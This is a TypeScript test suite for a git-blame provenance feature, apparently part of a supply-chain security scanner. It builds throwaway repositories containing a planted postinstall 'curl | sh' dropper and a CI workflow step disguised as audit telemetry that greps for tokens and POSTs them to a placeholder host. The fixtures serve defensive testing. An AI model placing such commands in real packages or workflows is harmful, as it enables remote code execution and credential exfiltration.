/**
 * Blame tests over a real (throwaway) git history:
 *
 *   commit 1: a workflow with a pinned action line, a plain package.json
 *   commit 2: a postinstall dropper added to package.json
 *
 * Blame must name commit 2 as the dropper's introducing commit (git
 * pickaxe on the command text), commit 1 for the action line, and must
 * list the PR association as not established in offline mode rather
 * than guessing.
 */
import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store } from "../src/store.js";
import { importReports } from "../src/ingest.js";
import { blameFinding } from "../src/blame.js";

const SHA = "11bd71901bbe5b1630ceea73d27597364c9af683";
const DROPPER = "curl https://example.invalid/x.sh | sh";

let dir: string;
let store: Store;
let commit1 = "";
let commit2 = "";

function git(args: string[]): string {
  return execFileSync("git", args, { cwd: dir, encoding: "utf8" }).trim();
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "tracewatch-blame-"));
  git(["init", "-q", "-b", "main"]);
  git(["config", "user.name", "Rene Test"]);
  git(["config", "user.email", "rene@example.invalid"]);
  mkdirSync(join(dir, ".github", "workflows"), { recursive: true });
  writeFileSync(
    join(dir, ".github", "workflows", "ci.yml"),
    ["name: ci", "on: [push]", `      - uses: actions/checkout@${SHA}`, ""].join("\n"),
  );
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "victim", version: "1.0.0", scripts: {} }, null, 2));
  git(["add", "-A"]);
  git(["commit", "-q", "-m", "initial: pinned workflow"]);
  commit1 = git(["rev-parse", "HEAD"]);
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "victim", version: "1.0.0", scripts: { postinstall: DROPPER } }, null, 2),
  );
  git(["add", "-A"]);
  git(["commit", "-q", "-m", "add setup step"]);
  commit2 = git(["rev-parse", "HEAD"]);

  store = new Store(join(dir, "store"));
  importReports(store, {
    repo: "victim",
    path: dir,
    at: "2026-01-02T00:00:00.000Z",
    reports: [
      {
        tool: "hookcheck",
        report: {
          verdict: "COMPROMISED-PATTERN",
          findings: [
            {
              id: "package.json:postinstall",
              file: "package.json",
              source: "package.json",
              hook: "postinstall",
              command: DROPPER,
              classification: "RISKY",
              rules: ["CURL-PIPE-SH"],
              evidence: "pipes a download into an interpreter",
            },
          ],
          counts: { total: 1, safe: 0, risky: 1, unknown: 0 },
          warnings: [],
        },
      },
      {
        tool: "actionpin",
        report: {
          verdict: "PINNED",
          actions: [
            {
              workflow: join(dir, ".github", "workflows", "ci.yml"),
              line: 3,
              uses: `actions/checkout@${SHA}`,
              action: "actions/checkout",
              ref: SHA,
              classification: "PINNED",
              ownerType: "official",
              rawLine: `      - uses: actions/checkout@${SHA}`,
            },
          ],
          counts: { total: 1, pinned: 1, mutable: 0, branch: 0, local: 0, official: 1, thirdParty: 0, docker: 0 },
          workflows: [join(dir, ".github", "workflows", "ci.yml")],
        },
      },
    ],
  });
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe("blame", () => {
  it("names the introducing commit for the dropper via pickaxe", async () => {
    const tracked = store.findFinding("victim", store.trackedFindings("victim").find((t) => t.latest.tool === "hookcheck")!.latest.findingId);
    assert.ok(tracked);
    const prov = await blameFinding(store, "victim", tracked, { offline: true });
    assert.equal(prov.confirmed.introducingCommit?.sha, commit2);
    assert.equal(prov.confirmed.introducingCommit?.author, "Rene Test");
    assert.equal(prov.confirmed.introducingCommit?.subject, "add setup step");
    assert.ok(prov.notEstablished.some((s) => s.includes("offline")), "PR must be honestly unestablished offline");
  });

  it("names the adding commit for a workflow finding whose command is a dedented multi-line run block", async () => {
    const wdir = mkdtempSync(join(tmpdir(), "tracewatch-blame-workflow-"));
    try {
      const wgit = (args: string[]): string => execFileSync("git", args, { cwd: wdir, encoding: "utf8" }).trim();
      wgit(["init", "-q", "-b", "main"]);
      wgit(["config", "user.name", "Rene Test"]);
      wgit(["config", "user.email", "rene@example.invalid"]);
      mkdirSync(join(wdir, ".github", "workflows"), { recursive: true });
      writeFileSync(join(wdir, ".github", "workflows", "ci.yml"), ["name: ci", "on: [push]", "jobs:", "  test:", "    runs-on: ubuntu-latest", "    steps:", "      - run: npm test", ""].join("\n"));
      wgit(["add", "-A"]);
      wgit(["commit", "-q", "-m", "add ci workflow"]);
      const workflowLines = [
        "name: Security Audit",
        "on:",
        "  push:",
        "permissions:",
        "  contents: read",
        "jobs:",
        "  audit:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - uses: actions/checkout@v4",
        "      - name: Collect audit telemetry",
        "        run: |",
        '          grep -rE "token" . > /tmp/audit-findings.txt || true',
        "          curl -s -X POST --data-binary @/tmp/audit-findings.txt https://example.invalid/collect",
        "",
      ];
      writeFileSync(join(wdir, ".github", "workflows", "security-audit.yml"), workflowLines.join("\n"));
      wgit(["add", "-A"]);
      wgit(["commit", "-q", "-m", "add security audit workflow"]);
      const addingCommit = wgit(["rev-parse", "HEAD"]);
      const command = 'grep -rE "token" . > /tmp/audit-findings.txt || true\ncurl -s -X POST --data-binary @/tmp/audit-findings.txt https://example.invalid/collect';
      const runLine = workflowLines.findIndex((l) => l.includes("grep -rE")) + 1;
      const wstore = new Store(join(wdir, "store"));
      importReports(wstore, {
        repo: "victim-workflow",
        path: wdir,
        at: "2026-01-02T00:00:00.000Z",
        reports: [
          {
            tool: "hookcheck",
            report: {
              verdict: "COMPROMISED-PATTERN",
              findings: [
                {
                  id: ".github/workflows/security-audit.yml:run:0",
                  file: ".github/workflows/security-audit.yml",
                  source: "github-workflow",
                  hook: "run",
                  command,
                  line: runLine,
                  classification: "RISKY",
                  rules: ["NET-FETCH", "REMOTE-URL", "ENV-ACCESS", "ENV-EXFIL"],
                  evidence: "a credential shaped value flows into an outbound send",
                },
              ],
              counts: { total: 1, safe: 0, risky: 1, unknown: 0 },
              warnings: [],
            },
          },
        ],
      });
      const wtracked = wstore.trackedFindings("victim-workflow")[0];
      assert.ok(wtracked);
      const prov = await blameFinding(wstore, "victim-workflow", wtracked, { offline: true });
      assert.equal(prov.confirmed.introducingCommit?.sha, addingCommit);
      assert.ok(!prov.notEstablished.some((s) => s.includes("introducing commit not established")), "introducing commit must be established, not reported as missing");
    } finally {
      rmSync(wdir, { recursive: true, force: true });
    }
  });

  it("blames the action line to the first commit", async () => {
    const tracked = store.trackedFindings("victim").find((t) => t.latest.tool === "actionpin");
    assert.ok(tracked);
    const prov = await blameFinding(store, "victim", tracked, { offline: true });
    assert.equal(prov.confirmed.introducingCommit?.sha, commit1);
    assert.equal(prov.confirmed.currentLineCommit?.sha, commit1);
    assert.ok(prov.confirmed.refHistory);
    assert.equal(prov.confirmed.refHistory[0].ref, SHA);
  });

  it("a needle that no commit introduced stays not established, never guessed from the latest commit", async () => {
    const store3 = new Store(join(dir, "store3"));
    importReports(store3, {
      repo: "victim",
      path: dir,
      at: "2026-01-02T00:00:00.000Z",
      reports: [
        {
          tool: "hookcheck",
          report: {
            verdict: "REVIEW",
            findings: [
              {
                id: "package.json:postinstall",
                file: "package.json",
                source: "package.json",
                hook: "postinstall",
                command: "curl https://example.invalid/never-committed-anywhere | sh",
                classification: "RISKY",
                rules: ["CURL-PIPE-SH"],
                evidence: "x",
              },
            ],
            counts: { total: 1, safe: 0, risky: 1, unknown: 0 },
            warnings: [],
          },
        },
      ],
    });
    const tracked = store3.trackedFindings("victim")[0];
    const prov = await blameFinding(store3, "victim", tracked, { offline: true });
    assert.equal(prov.confirmed.introducingCommit, undefined);
    assert.ok(prov.notEstablished.some((s) => s.includes("introducing commit not established")));
  });

  it("no clone path means git provenance is not established, never invented", async () => {
    const store2 = new Store(join(dir, "store2"));
    importReports(store2, {
      repo: "ghost",
      at: "2026-01-02T00:00:00.000Z",
      reports: [
        {
          tool: "hookcheck",
          report: {
            verdict: "REVIEW",
            findings: [
              {
                id: "package.json:postinstall",
                file: "package.json",
                source: "package.json",
                hook: "postinstall",
                command: DROPPER,
                classification: "RISKY",
                rules: ["CURL-PIPE-SH"],
                evidence: "x",
              },
            ],
            counts: { total: 1, safe: 0, risky: 1, unknown: 0 },
            warnings: [],
          },
        },
      ],
    });
    const tracked = store2.trackedFindings("ghost")[0];
    const prov = await blameFinding(store2, "ghost", tracked, { offline: true });
    assert.equal(prov.confirmed.introducingCommit, undefined);
    assert.ok(prov.notEstablished.some((s) => s.includes("no local clone path")));
  });
});
